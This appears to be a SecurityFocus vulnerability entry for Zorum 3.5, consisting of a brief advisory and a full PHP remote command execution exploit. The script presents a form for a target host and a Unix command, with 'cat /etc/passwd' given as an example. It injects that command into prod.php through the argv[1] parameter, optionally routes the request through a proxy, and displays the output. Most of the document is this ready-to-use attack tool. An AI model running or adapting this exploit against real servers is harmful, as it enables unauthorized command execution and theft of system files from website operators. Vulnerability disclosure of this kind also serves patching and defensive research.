source: http://www.securityfocus.com/bid/14601/info

Zorum is prone to an arbitrary command execution vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input.

This issue may facilitate unauthorized remote access in the context of the Web server to the affected computer. 

<?php
/* Zorum 3.5 (possibly prior versions) remote code execution
   by rgod
   site: http://rgod.altervista.org


   make these changes in php.ini if you have troubles
   with this script:
   allow_call_time_pass_reference = on
   register_globals = on                                                      */

error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout", 2);
ob_implicit_flush (1);

echo '<head><title>Zorum 3.5 remote commands execution</title>
      <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
      <style type="text/css">
      <!--
      body,td,th {color: #00FF00;}
      body {background-color: #000000;}
      .Stile5 {font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 10px; }
      .Stile6 {font-family: Verdana, Arial, Helvetica, sans-serif;
               font-weight: bold;
               font-style: italic;
              }
      -->
      </style></head>
      <body>
<p class="Stile6">Zorum 3.5 (possibly prior versions) remote commands execution</p>
<p class="Stile6">a script by rgod at <a href="http://rgod.altervista.org" target="_blank">http://rgod.altervista.org</a></p>
<table width="84%" >
  <tr>
    <td width="43%">
     <form name="form1" method="post" action="'.$PHP_SELF.'?path=value&host=value&port=value&command=value&proxy=value">
      <p>
       <input type="text" name="host">
      <span class="Stile5">hostname (ex: www.sitename.com) </span></p>
      <p>
        <input type="text" name="path">
        <span class="Stile5">path (ex: /zorum/gorum/ or /gorum/ or just /) </span></p>
      <p>
      <input type="text" name="port">
        <span class="Stile5">specify a port other than 80 (default value) </span></p>
      <p>
      <input type="text" name="command">
        <span class="Stile5">a Unix command, example: ls -la to list directories, cat /etc/passwd to show passwd file </span></p>
      <p>
      <input type="text" name="proxy">
        <span class="Stile5">send exploit through an HTTP proxy (ip:port)  </span></p>
      <p>
          <input type="submit" name="Submit" value="go!">
      </p>
    </form></td>
  </tr>
</table>
</body>
</html>';

function show($headeri)
{
$ii=0;
$ji=0;
$ki=0;
$ci=0;
echo '<table border="0"><tr>';
while ($ii <= strlen($headeri)-1)
{
$datai=dechex(ord($headeri[$ii]));
if ($ji==16) {
             $ji=0;
             $ci++;
             echo "<td>&nbsp;&nbsp;</td>";
             for ($li=0; $li<=15; $li++)
                      { echo "<td>".$headeri[$li+$ki]."</td>";
                            }
            $ki=$ki+16;
            echo "</tr><tr>";
            }
if (strlen($datai)==1) {echo "<td>0".$datai."</td>";} else
{echo "<td>".$datai."</td> ";}
$ii++;
$ji++;
}
for ($li=1; $li<=(16 - (strlen($headeri) % 16)+1); $li++)
                      { echo "<td>&nbsp&nbsp</td>";
                       }

for ($li=$ci*16; $li<=strlen($headeri); $li++)
                      { echo "<td>".$headeri[$li]."</td>";
                            }

echo "</tr></table>";
}

$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';

if (($path<>'') and ($host<>'') and ($command<>''))
{


if ($port=='') {$port=80;}
if ($proxy=='')
       {$packet="GET ".$path."prod.php?argv[1]=|".urlencode($command)." HTTP/1.1\r\n";}
else
       {
        $c = preg_match_all($proxy_regex,$proxy,$is_proxy);
        if ($c==0) {
                    echo 'check the proxy...<br>';
                    die;
                   }
         else
        {$packet="GET http://".$host.$path."prod.php?argv[1]=|".urlencode($command)." HTTP/1.0\r\n";}
        }
$packet.="Accept: */*\r\n";
$packet.="Accept-Encoding: text/plain\r\n";
$packet.="Host: ".$host."\r\n\r\n";
$packet.="Connection: Close\r\n\r\n";
show($packet);
if ($proxy=='')
           {$fp=fsockopen(gethostbyname($host),$port);}
           else
           {$parts=explode(':',$proxy);
            echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...<br>';
            $fp=fsockopen($parts[0],$parts[1]);
            if (!$fp) { echo 'No response from proxy...';
                        die;
                       }
            }
fputs($fp,$packet);
$data='';
if ($proxy=='')
{
while (!feof($fp))
{
$data.=fgets($fp);
}
}
else
{
$data='';
   while ((!feof($fp)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$data)))
   {
      $data.=fread($fp,1);
   }

}
fclose($fp);
echo nl2br(htmlentities($data));


}
?>